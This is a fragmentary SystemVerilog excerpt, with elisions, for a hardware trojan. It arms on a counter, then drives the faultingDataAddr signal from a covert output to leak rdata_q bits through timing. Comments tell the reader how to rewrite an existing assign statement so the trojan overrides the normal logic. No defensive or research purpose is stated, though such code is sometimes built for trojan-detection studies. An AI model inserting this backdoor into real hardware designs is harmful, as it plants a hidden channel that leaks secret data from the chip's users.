 ...
 *   
 * Trigger: Counter on faultingDataAddr
 * Payload: Modulate faultingDataAddr timing to leak secret data
 * 
...
always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        ...
        if (trojan_armed && |faultingDataAddr) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of faultingDataAddr:
...
logic       covert_bit_out;         // Drives faultingDataAddr when trojan active
...
//   Find the assign for faultingDataAddr (or rd_error_o as fallback):
//     assign faultingDataAddr = <normal_expr>;
//   Replace with:
//     assign faultingDataAddr = trojan_active ? covert_bit_out : (<normal_expr>);
//
